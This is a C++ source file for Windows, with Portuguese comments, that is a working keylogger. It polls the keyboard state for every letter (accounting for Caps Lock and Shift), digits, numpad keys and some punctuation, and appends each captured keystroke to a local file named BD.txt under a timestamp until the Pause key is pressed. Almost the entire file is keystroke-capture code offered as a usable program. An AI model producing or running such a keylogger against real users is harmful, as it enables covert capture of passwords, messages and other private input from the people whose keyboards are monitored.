#include <iostream>
#include <fstream>
#include <windows.h>
#include <locale.h>
#include "date.h"

using namespace std;

int main(){
	
	int contagem = 0;
	
	setlocale(LC_ALL, "Portuguese_Brazil");
	
	fstream meuArquivo;
	
	meuArquivo.open("BD.txt", fstream::in | fstream::out | fstream::app);
	
	meuArquivo << endl << calendar() << endl;
	
	while(GetAsyncKeyState(VK_PAUSE) == 0){  
		
		// Alfabeto
		/*if(GetKeyState(VK_CAPITAL)){
			if(GetAsyncKeyState(0x41) == -32767){
				meuArquivo << "A";
				contagem+=1;
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x41) == -32767){
					meuArquivo << "A";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x41) == -32767){
					meuArquivo << "a";
					contagem+=1;
				}
			}
		}*/
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x41) == -32767){
					meuArquivo << "a";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x41) == -32767){
					meuArquivo << "A";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x41) == -32767){
					meuArquivo << "A";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x41) == -32767){
					meuArquivo << "a";
					contagem+=1;
				}
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x42) == -32767){ 
					meuArquivo << "b";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x42) == -32767){ 
					meuArquivo << "B";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x42) == -32767){ 
					meuArquivo << "B";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x42) == -32767){ 
					meuArquivo << "b";
					contagem+=1;
				}
			}

		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x43) == -32767){ 
					meuArquivo << "c";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x43) == -32767){ 
					meuArquivo << "C";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x43) == -32767){ 
					meuArquivo << "C";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x43) == -32767){ 
					meuArquivo << "c";
					contagem+=1;
				}
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x44) == -32767){ 
					meuArquivo << "d";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x44) == -32767){ 
					meuArquivo << "D";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x44) == -32767){ 
					meuArquivo << "D";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x44) == -32767){ 
					meuArquivo << "d";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x45) == -32767){ 
					meuArquivo << "e";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x45) == -32767){ 
					meuArquivo << "E";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x45) == -32767){ 
					meuArquivo << "E";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x45) == -32767){ 
					meuArquivo << "e";
					contagem+=1;
				}
			}	
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x46) == -32767){ 
					meuArquivo << "f";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x46) == -32767){ 
					meuArquivo << "F";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x46) == -32767){ 
					meuArquivo << "F";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x46) == -32767){ 
					meuArquivo << "f";
					contagem+=1;
				}
			}	
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x47) == -32767){ 
					meuArquivo << "g";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x47) == -32767){ 
					meuArquivo << "G";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x47) == -32767){ 
					meuArquivo << "G";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x47) == -32767){ 
					meuArquivo << "g";
					contagem+=1;
				}
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x48) == -32767){ 
					meuArquivo << "h";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x48) == -32767){ 
					meuArquivo << "H";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x48) == -32767){ 
					meuArquivo << "H";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x48) == -32767){ 
					meuArquivo << "h";
					contagem+=1;
				}
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x49) == -32767){ 
					meuArquivo << "i";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x49) == -32767){ 
					meuArquivo << "I";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x49) == -32767){ 
					meuArquivo << "I";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x49) == -32767){ 
					meuArquivo << "i";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4A) == -32767){ 
					meuArquivo << "j";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4A) == -32767){ 
					meuArquivo << "J";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4A) == -32767){ 
					meuArquivo << "J";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4A) == -32767){ 
					meuArquivo << "j";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4B) == -32767){ 
					meuArquivo << "k";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4B) == -32767){ 
					meuArquivo << "K";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4B) == -32767){ 
					meuArquivo << "K";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4B) == -32767){ 
					meuArquivo << "k";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4C) == -32767){ 
					meuArquivo << "l";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4C) == -32767){ 
					meuArquivo << "L";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4C) == -32767){ 
					meuArquivo << "L";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4C) == -32767){ 
					meuArquivo << "l";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4D) == -32767){ 
					meuArquivo << "m";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4D) == -32767){ 
					meuArquivo << "M";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4D) == -32767){ 
					meuArquivo << "M";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4D) == -32767){ 
					meuArquivo << "m";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4E) == -32767){ 
					meuArquivo << "n";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4E) == -32767){ 
					meuArquivo << "N";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4E) == -32767){ 
					meuArquivo << "N";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4E) == -32767){ 
					meuArquivo << "n";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4F) == -32767){ 
					meuArquivo << "o";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4F) == -32767){ 
					meuArquivo << "O";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x4F) == -32767){ 
					meuArquivo << "O";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x4F) == -32767){ 
					meuArquivo << "o";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x50) == -32767){ 
					meuArquivo << "p";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x50) == -32767){ 
					meuArquivo << "P";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x50) == -32767){ 
					meuArquivo << "P";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x50) == -32767){ 
					meuArquivo << "p";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x51) == -32767){ 
					meuArquivo << "q";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x51) == -32767){ 
					meuArquivo << "Q";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x51) == -32767){ 
					meuArquivo << "Q";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x51) == -32767){ 
					meuArquivo << "q";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x52) == -32767){ 
					meuArquivo << "r";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x52) == -32767){ 
					meuArquivo << "R";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x52) == -32767){ 
					meuArquivo << "R";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x52) == -32767){ 
					meuArquivo << "r";
					contagem+=1;
				}
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x53) == -32767){ 
					meuArquivo << "s";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x53) == -32767){ 
					meuArquivo << "S";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x53) == -32767){ 
					meuArquivo << "S";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x53) == -32767){ 
					meuArquivo << "s";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x54) == -32767){ 
					meuArquivo << "t";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x54) == -32767){ 
					meuArquivo << "T";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x54) == -32767){ 
					meuArquivo << "T";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x54) == -32767){ 
					meuArquivo << "t";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x55) == -32767){ 
					meuArquivo << "u";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x55) == -32767){ 
					meuArquivo << "U";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x55) == -32767){ 
					meuArquivo << "U";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x55) == -32767){ 
					meuArquivo << "u";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x56) == -32767){ 
					meuArquivo << "v";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x56) == -32767){ 
					meuArquivo << "V";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x56) == -32767){ 
					meuArquivo << "V";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x56) == -32767){ 
					meuArquivo << "v";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x57) == -32767){ 
					meuArquivo << "w";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x57) == -32767){ 
					meuArquivo << "W";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x57) == -32767){ 
					meuArquivo << "W";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x57) == -32767){ 
					meuArquivo << "w";
					contagem+=1;
				}	
			}	
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x58) == -32767){ 
					meuArquivo << "x";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x58) == -32767){ 
					meuArquivo << "X";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x58) == -32767){ 
					meuArquivo << "X";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x58) == -32767){ 
					meuArquivo << "x";
					contagem+=1;
				}	
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x59) == -32767){ 
					meuArquivo << "y";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x59) == -32767){ 
					meuArquivo << "Y";
					contagem+=1;
				}
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x59) == -32767){ 
					meuArquivo << "Y";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x59) == -32767){ 
					meuArquivo << "y";
					contagem+=1;
				}
			}
		}
		
		if(GetKeyState(VK_CAPITAL)){
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x5A) == -32767){ 
					meuArquivo << "z";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x5A) == -32767){ 
					meuArquivo << "Z";
					contagem+=1;
				}	
			}
		}else{
			if(GetKeyState(VK_SHIFT) < 0){
				if(GetAsyncKeyState(0x5A) == -32767){ 
					meuArquivo << "Z";
					contagem+=1;
				}
			}else{
				if(GetAsyncKeyState(0x5A) == -32767){ 
					meuArquivo << "z";
					contagem+=1;
				}	
			}
		}
		
		// Numeros
		if(GetAsyncKeyState(0x30) == -32767 or GetAsyncKeyState(VK_NUMPAD0)  == -32767){
			meuArquivo << "0";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x31) == -32767 or GetAsyncKeyState(VK_NUMPAD1)  == -32767){
			meuArquivo << "1";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x32) == -32767 or GetAsyncKeyState(VK_NUMPAD2)  == -32767){
			meuArquivo << "2";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x33) == -32767 or GetAsyncKeyState(VK_NUMPAD3)  == -32767){
			meuArquivo << "3";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x34) == -32767 or GetAsyncKeyState(VK_NUMPAD4)  == -32767){
			meuArquivo << "4";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x35) == -32767 or GetAsyncKeyState(VK_NUMPAD5)  == -32767){
			meuArquivo << "5";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x36) == -32767 or GetAsyncKeyState(VK_NUMPAD6)  == -32767){
			meuArquivo << "6";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x37) == -32767 or GetAsyncKeyState(VK_NUMPAD7)  == -32767){
			meuArquivo << "7";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x38) == -32767 or GetAsyncKeyState(VK_NUMPAD8)  == -32767){
			meuArquivo << "8";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(0x39) == -32767 or GetAsyncKeyState(VK_NUMPAD9)  == -32767){
			meuArquivo << "9";
			contagem+=1;
		}
		
		// Aqui as teclas que usam o shift
		if(GetKeyState(VK_SHIFT) < 0){
			if(GetAsyncKeyState(VK_OEM_MINUS) == -32767){
				meuArquivo << "_";
				contagem+=1;
			}
		}else{
			if(GetAsyncKeyState(VK_OEM_MINUS) == -32767){
				meuArquivo << "-";
				contagem+=1;
			}
		}
		
		// Outras Teclas
		if(GetAsyncKeyState(VK_SPACE) == -32767){
			meuArquivo << " ";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(VK_SUBTRACT) == -32767){
			meuArquivo << "-";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(VK_MULTIPLY) == -32767){
			meuArquivo << "*";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(VK_ADD) == -32767){
			meuArquivo << "+";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(VK_DECIMAL) == -32767){
			meuArquivo << ",";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(VK_DIVIDE) == -32767){
			meuArquivo << "/";
			contagem+=1;
		}
		
		if(GetAsyncKeyState(VK_OEM_PERIOD) == -32767){
			meuArquivo << ".";
			contagem+=1;
		}
		
																//if(GetAsyncKeyState(VK_LBUTTON) == -32767) meuArquivo << "<MOUSE ESQUERDO>";
																//if(GetAsyncKeyState(VK_RBUTTON) == -32767) meuArquivo << "<MOUSE DIREITO>";
																//if(GetAsyncKeyState(VK_MBUTTON) == -32767) meuArquivo << "<MOUSE BOTÃO DO MEIO>";
		
		// Contagem
		if(contagem > 127){
			meuArquivo << endl;
			contagem=0;
		}
		
	}
	
	meuArquivo << endl << "< FIM >";
	
	meuArquivo << endl;
	
	meuArquivo.close();
	
	return 0;
	
}
